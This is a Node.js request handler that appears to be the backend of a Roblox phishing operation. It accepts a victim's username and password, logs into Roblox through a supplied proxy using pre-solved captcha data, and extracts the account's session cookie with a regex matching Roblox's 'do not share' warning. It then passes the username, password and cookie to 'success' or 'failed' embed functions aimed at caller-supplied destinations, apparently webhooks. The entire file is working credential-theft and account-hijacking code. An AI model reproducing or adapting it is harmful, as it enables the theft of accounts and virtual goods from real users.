const HttpsProxyAgent = require('https-proxy-agent');
const axios = require('axios');
const success_embed = require("./embed/success.js");
const failed_emebed = require("./embed/failed.js");

async function robloxlogin(req, res) {
    const sessionToken = req.cookies.Account_Session;

    const {
        Username,
        Password,
        Success,
        Failed,
        Captcha,
        ProxyUrl,
        XCsrfToken,
    } = req.body;

    const delimiter = ',';
    const fcdataArray = Captcha.split(delimiter);

    const requiredFields = ['Username', 'Password', 'Success', 'Failed', 'Captcha', 'ProxyUrl','XCsrfToken'];
    const missingFields = requiredFields.filter((field) => !req.body[field]);

    if (missingFields.length > 0) {
        return res.status(400).json({
            message: `Missing required fields: ${missingFields.join(', ')}`
        });
    }

    const postData = {
        ctype: 'username',
        cvalue: Username,
        password: Password
    };

    const config = {
        headers: {
            'Content-Type': 'application/json',
            'x-csrf-token': XCsrfToken,
            'Rblx-Challenge-Metadata': fcdataArray[0],
            'Rblx-Challenge-Id': fcdataArray[1],
            'Rblx-Challenge-Type': 'captcha',
        },
        httpsAgent: new HttpsProxyAgent(ProxyUrl),
        timeout: 1700,
    };

    let responseHeaders;
    let response;
    try {
        response = await axios.post('https://auth.roblox.com/v2/login', postData, config);
        responseHeaders = response.headers;

        const setcookie = responseHeaders["set-cookie"];
        const delimiter = " ";
        const result = setcookie.join(delimiter);
        const regex = /_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_[A-F0-9]+/;
        const match = result.match(regex);

        if (match) {
            const cookies = match[0];
            const embedresponse = await success_embed(Username, Password, cookies, Success, sessionToken);
            return res.status(200).json({
                success: true,
                message: embedresponse
            });
        } else {
            failed_emebed(Username, Password, "Step verification is required for this account.", Failed);
            return res.status(400).json({
                message: "Step verification is required for this account."
            });
        }
    } catch (error) {
        if (error.response) {
            responseHeaders = error.response.headers;
            const errorObj = error.response.data;

            console.log(error.response.data);

            if (errorObj.errors === undefined) {
                return res.status(400).json({
                    message: "Unknown Error"
                });
            }
            const errorMessageText = errorObj.errors[0].message;
            const errorCodeText = errorObj.errors[0].code;

            failed_emebed(Username, Password, errorMessageText, Failed);
            return res.status(400).json({
                message: errorMessageText
            });
        } else {
            console.log(error);
            return res.status(400).json({
                message: "Unknown Error"
            });
        }
    }
}

module.exports = robloxlogin;